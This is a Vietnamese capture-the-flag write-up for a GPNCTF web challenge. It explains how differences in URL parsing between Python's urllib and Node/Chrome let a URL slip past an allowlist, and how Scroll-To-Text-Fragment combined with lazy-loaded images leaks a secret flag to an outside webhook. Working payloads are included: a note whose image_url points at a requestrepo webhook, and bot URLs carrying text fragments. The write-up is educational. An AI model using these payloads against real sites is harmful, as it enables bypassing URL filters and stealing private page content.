# Overview
1 challenge XSS kết hợp với bypass URL filter, lấy được flag thông qua kỹ thuật XS-Leak.

Các route chính 
- `/login`: Lấy username của mình và đưa vào session
- `/dashboard`: hiện tất cả title của các note đã tạo bên sidebar
- `/note/new`: tạo note mới với 3 biến đầu vào title, content, image_url
- `/note/<note_id>`: xem note
- `/bot`: gửi url cho bot


Chú ý:
```python=
def validate_url(url: str, target_domain: str = None) -> bool:
    try:
        parsed = urlparse(url)
        print(f"Parsed URL: {parsed}")
        if parsed.scheme not in ('http', 'https') or not parsed.hostname:
            return False
        if target_domain and parsed.hostname != target_domain:
            return False
        return True
    except Exception:
        return False
```

Hàm này sẽ giới hạn đầu vào của người dùng khi sử dụng urllib để xem hostname của người dùng gửi vào có khác target_domain hay không.

Nó được sử dụng khi gửi lên `image_url` tạo note mới hoặc gửi url cho bot.
- Giới hạn image gửi lên ở `imgur.com`
![image](https://hackmd.io/_uploads/B1KGwaANeg.png)
- Giới hạn link gửi cho bot ở `example.com`
![image](https://hackmd.io/_uploads/rkI4vTR4lx.png)

Mục tiêu là XSS được nhưng hãy nhìn xem các file `.html` khi `render_template`
![image](https://hackmd.io/_uploads/r1pjw6CNxl.png)
![image](https://hackmd.io/_uploads/ryshPpAExg.png)

Đều đã sử dụng Jinja2 để render_template, do vậy nó sẽ escape hết tất cả các dấu `"` và `<>`.

Vậy có 2 câu hỏi lớn ở đây:
1. Gửi link cho bot để lấy flag kiểu gì?
2. XSS kiểu gì?

## Trả lời câu hỏi 1: Bypass URL Filter
Vấn đề đó là FLask sử dụng Python với thư viện `urllib.parse` để phân tích URL trong khi bot sử dụng Puppeteer (Node.js) dẫn đến sự khác biệt trong các phân tích URL.

[urllib.parse](https://github.com/python/cpython/blob/3.12/Lib/urllib/parse.py#L22) của Flask không hoàn toàn tuân thủ theo chuẩn RFC3986 còn Pupeteer của Nodejs thì có.
![image](https://hackmd.io/_uploads/Sy0At6CElg.png)

Cho nên sẽ dẫn đến những sự khác biệt sau:
1. **Parser Differential #1:** Dấu **backslash** `\` được hiểu là dấu **forwardslash** `/` trong Node.js, nhưng Python thì không. Do vậy url sau `http://webhook\@example.com`, phần `webhook\` sẽ được coi như username trong URL của Python, còn với Nodejs nó sẽ thành `http://webhook/@example.com`, `webhook` sẽ thành domain và `@example` thành path
2. **Parser Differential #2:** Đường dẫn `../` trong Nodejs sẽ dẫn đến truy cập thư mục cha, ví dụ `http://example.com/abcd/../`, Nodejs sẽ hiểu là `http://example.com/`, các trình duyệt hiện đại như Chrome và Firefox cũng sử dụng chuẩn RFC3986 cho nên việc này cũng xảy ra. Trong khi Python không xử lý như vậy.

:arrow_right: **Kết luận**: sử dụng những sự khác biệt này để bypass với payload sau: `https://webhook\@example.com/../`
Khi đó URL được gửi cho bot sẽ là `https://webhook/`

### Nhưng bypass được filter rồi khai thác như nào?
![image](https://hackmd.io/_uploads/SydWApR4le.png)

Phần chính của file `view_note`. title và content đã được truyền vào bằng Jinja2 template tuy nhiên phần src của ảnh không hề có dấu nháy để bao vào, khi đó chúng ta có thể chèn thêm 1 attribute bất kỳ vào ảnh.

![image](https://hackmd.io/_uploads/HJ1906ANgl.png)
CSP rất chặt cho nên không thể chèn các event vào để kích hoạt Javascript.

Tuy nhiên, con bot sẽ tạo note với flag ở cả content và title.
![image](https://hackmd.io/_uploads/BkM60a04xl.png)

:arrow_right: Cho nên sẽ dẫn đến 1 kỹ thuật khai thác XS-Leak

## Trả lời câu hỏi 2: Kỹ thuật XS-Leak
Các kỹ thuật khai thác với XS-Leak được viết khá là đầy đủ trong [đây](https://xsleaks.dev/).

Trong bài này sẽ kết hợp tính năng của trình duyệt [Scroll-To-Text-Fragment](https://github.com/WICG/scroll-to-text-fragment) cùng với lazy loading.

Tạo note như sau: `A\n` * 500 + `FLAG_NOT_FOUND` và image_url là link webhook với thuộc tính `loading=lazy`.
![image](https://hackmd.io/_uploads/ByPerACVgl.png)
- Cho note với các kí tự như này bởi vì để tách biệt phần sidebar với ảnh được load
- Sử dụng STTF như sau: `#:~:text=GPNCTF{🛶&text=FLAG_NOT_FOUND` 
    - Nếu kí tự đầu của flag đúng thì nó chỉ cuộn đến phần sidebar (hoặc nói đúng hơn là đứng yên), và chữ `FLAG_NOT_FOUND` sẽ không được tìm kiếm
    - Nhưng nếu kí tự đầu của flag sai: STTF sẽ tìm kiếm từ `FLAG_NOT_FOUND` nên sẽ cuộn xuống cuối trang tách biệt với sidebar, khi đó ảnh sẽ được load và có request đến webhook

-> Kết luận: Khi kí tự flag đúng thì sẽ không có request đến webhook còn nếu đúng thì sẽ không có.

Payload: 
1. Tạo note
```
{
    "title":"Test note",
    "content":"A\n" * 500 + "FLAG_NOT_FOUND",
    "image_url":"https://9m42157q.requestrepo.com\@imgur.com/../"
}
```

2. URL gửi cho bot
`http://localhost:9222/note/62650069-d8af-4e6f-9625-fc083387ab57#:~:text=GPNCTF{🛶&text=FLAG_NOT_FOUND`

Original Writeup: https://adrianjunge.de/ctf/gpnctf/Smile%20at%20me


### Note:
1. Có thể gửi cho bot 1 tập hợp các emoji như tìm kiếm nhanh hơn
`/bot?url=http://localhost:9222\@example.com/../note/<note-id>%23:~:text=GPNCTF{🤔%26text=GPNCTF{🏃%26text=GPNCTF{🍬...%26text=GPNCTF{💹%26text=FLAG_NOT_FOUND`
    - script của tác giả sử dụng Tailscale funnel làm 1 webhook phản ứng với các yêu cầu đến từ bot rồi từ đó xem xét việc tạo payload tiếp theo. Kiểu nếu mà không có request đến webhook thì trong tập hợp các emoji đã gửi có kí tự đúng.
2. Tác giả có nói rằng STTF chỉ tìm kiếm các từ đầy đủ, không cho phép tìm kiếm phần của từ (partial word). Điều này có thể làm cho việc khai thác bằng cách brute force (tấn công thử tất cả các khả năng) một cách chi tiết (ví dụ: từng ký tự trong flag) trở nên khó khăn. Nếu web bao bọc các đoạn văn bản bằng thẻ span thì cách này thực hiện được 
    - Tuy nhiên trong bài này kí tự flag là emoji. Emoji là những ký tự đặc biệt có thể được xem là một từ hoàn chỉnh, do đó, chúng có thể được tìm kiếm và làm nổi bật trong STTF như một toàn bộ ký tự.
